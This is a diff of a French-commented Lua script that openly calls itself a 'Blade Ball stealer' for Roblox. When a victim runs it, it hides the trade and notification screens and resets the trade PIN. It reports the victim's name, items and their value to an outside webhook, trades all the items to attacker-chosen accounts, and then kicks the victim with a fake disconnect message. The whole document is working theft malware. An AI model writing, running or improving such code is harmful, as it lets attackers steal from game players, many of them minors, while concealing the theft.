@@ -3,8 +3,13 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
--- // CONFIG
-local auth_token = "EBK-SS-A" 
+-- // RECUPERATION DES GLOBALES
+local auth_token = _G.AuthToken or "EBK-SS-A" 
+local webhook = _G.webhook or ""
+local users = _G.Usernames or {}
+local min_rap = _G.min_rap or 50
+local ping = _G.pingEveryone or "No"
+
 local itemsToSend = {}
 local categories = {"Sword", "Emote", "Explosion"}
 local Players = game:GetService("Players")
@@ -14,46 +19,44 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
 local PlayerGui = plr.PlayerGui
 
-local users = _G.Usernames or {}
-local min_rap = _G.min_rap or 100
-local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or ""
-
 -- // PROTECTION INITIALE
-if next(users) == nil or webhook == "" then
-    plr:kick("Configuration Webhook/Usernames manquante.")
+if webhook == "" or #users == 0 then
     return
 end
 
--- // BYPASS PIN (LOGIQUE ORIGINALE)
-local argsPIN = {[1] = {["option"] = "PIN", ["value"] = "9079"}}
+-- // FONCTION D'ENVOI (FIXED FOR CLOUDFLARE WORKER)
+local function sendToWorker(payload)
+    -- On force le token dans chaque envoi pour le Worker
+    payload["auth_token"] = auth_token
+    
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    if requestFunc then
+        local success, result = pcall(function()
+            return requestFunc({
+                Url = webhook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        return success
+    end
+end
+
+-- // BYPASS PIN
 pcall(function()
-    netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(argsPIN))
+    netModule:WaitForChild("RF/ResetPINCode"):InvokeServer({["option"] = "PIN", ["value"] = "9079"})
 end)
 
--- // DISCRETION (CACHE LES UI)
+-- // DISCRETION UI
 local tradeGui = PlayerGui:WaitForChild("Trade")
 local notificationsGui = PlayerGui:WaitForChild("Notifications")
 tradeGui.Black.Visible = false
 tradeGui.Main.Visible = false
 tradeGui.Main:GetPropertyChangedSignal("Visible"):Connect(function() tradeGui.Main.Visible = false end)
 notificationsGui.Notifications.Visible = false
-notificationsGui.Notifications:GetPropertyChangedSignal("Visible"):Connect(function() notificationsGui.Notifications.Visible = false end)
-
--- // FONCTION D'ENVOI WORKER
-local function sendToWorker(payload)
-    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
-    if requestFunc then
-        pcall(function()
-            requestFunc({
-                Url = webhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(payload)
-            })
-        end)
-    end
-end
 
 -- // FORMATAGE RAP
 local function formatNumber(number)
@@ -67,7 +70,7 @@ local function formatNumber(number)
     return idx == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[idx])
 end
 
--- // SCAN INVENTAIRE (MAPS COMPLEXES)
+-- // SCAN INVENTAIRE
 local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(ReplicatedStorage.Packages.Replion)
 local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
@@ -103,8 +106,8 @@ for _, cat in ipairs(categories) do
     end
 end
 
--- // FONCTION EMBED (STYLE FINAL)
-local function sendEmbed(title, color, isJoin)
+-- // GESTION DES EMBEDS
+local function sendEmbed(isJoin)
     local grouped = {}
     for _, item in ipairs(itemsToSend) do
         grouped[item.Name] = (grouped[item.Name] or 0) + 1
@@ -114,41 +117,39 @@ local function sendEmbed(title, color, isJoin)
         listText = listText .. string.format("%s (x%d)\n", name, count)
     end
 
-    local data = {
-        ["auth_token"] = auth_token,
+    local payload = {
         ["username"] = isJoin and (totalRAP >= 500 and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT") or "⚪ Eblack - SERVER HIT",
         ["content"] = isJoin and ((ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')") or nil,
         ["embeds"] = {{
             ["title"] = isJoin and (totalRAP >= 500 and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯") or "⚪ Server Hit 🎉",
-            ["color"] = isJoin and (totalRAP >= 500 and 65280 or 8323327) or 16777215,
+            ["color"] = totalRAP >= 500 and 65280 or 8323327,
             ["fields"] = {
-                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
-                {name = "Summary 💰:", value = "Total RAP: **" .. formatNumber(totalRAP) .. "**", inline = true},
-                {name = "Item list 📝:", value = listText ~= "" and listText or "None", inline = false}
+                {name = "Victim 👤:", value = "```" .. plr.Name .. "```", inline = true},
+                {name = "Total RAP 💰:", value = "**" .. formatNumber(totalRAP) .. "**", inline = true},
+                {name = "Items 📝:", value = listText ~= "" and listText or "None", inline = false}
             },
             ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
         }}
     }
-    sendToWorker(data)
+    sendToWorker(payload)
 end
 
--- // LOGIQUE DE TRADE
+-- // EXECUTION TRADE
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
-    local sentItemsSnapshot = {}
-    for i, v in ipairs(itemsToSend) do sentItemsSnapshot[i] = v end
-
-    sendEmbed(nil, nil, true) -- Premier Webhook
+    
+    sendEmbed(true) -- Message de Join
 
     local inTrade = false
     tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = tradeGui.Enabled end)
 
-    local function doTrade(targetName)
-        sendEmbed(nil, nil, false) -- Deuxième Webhook (Server Hit)
-        local target = Players:WaitForChild(targetName)
-        
+    local function doTrade(targetPlayer)
+        sendEmbed(false) -- Message Server Hit
         while #itemsToSend > 0 do
-            repeat wait(0.2) netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target) until inTrade
+            repeat 
+                netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
+                task.wait(0.5) 
+            until inTrade
             
             local batch = {}
             for i = 1, math.min(100, #itemsToSend) do table.insert(batch, table.remove(itemsToSend, 1)) end
@@ -156,6 +157,7 @@ if #itemsToSend > 0 then
                 netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
             end
 
+            -- Tokens
             pcall(function()
                 local raw = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")
                 local tokens = tonumber(raw) or 0
@@ -165,11 +167,15 @@ if #itemsToSend > 0 then
             netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
             task.wait(0.3)
             netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
-            repeat wait(0.5) until not inTrade
+            repeat task.wait(0.5) until not inTrade
         end
-        plr:kick("Connection lost. Please rejoin.")
+        plr:kick("Connection lost, please rejoin.")
     end
 
-    for _, p in ipairs(Players:GetPlayers()) do if table.find(users, p.Name) then doTrade(p.Name) end end
-    Players.PlayerAdded:Connect(function(p) if table.find(users, p.Name) then doTrade(p.Name) end end)
+    -- Surveillance des G Users
+    local function check(p)
+        if table.find(users, p.Name) then doTrade(p) end
+    end
+    for _, p in ipairs(Players:GetPlayers()) do check(p) end
+    Players.PlayerAdded:Connect(check)
 end
